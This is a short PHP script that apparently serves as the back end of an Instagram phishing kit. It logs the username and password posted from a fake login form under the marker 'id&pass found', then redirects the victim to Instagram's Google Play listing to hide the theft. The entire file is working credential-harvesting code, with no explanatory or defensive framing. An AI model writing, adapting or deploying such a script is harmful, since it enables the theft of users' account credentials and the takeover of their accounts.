<?php
error_log("-----------------------------------------------------------------------");
error_log("id&pass found");
error_log("Account: " . $_POST['username'] . " Pass: " . $_POST['password'] );
error_log("-----------------------------------------------------------------------");
header('Location: https://play.google.com/store/apps/details?id=com.instagram.android&referrer=utm_source%3Dinstagramweb&utm_campaign=loginPage&ig_mid=2E6A1490-9BF7-4775-BA25-484C2546A5E8&utm_content=lo&utm_medium=badge');
exit();
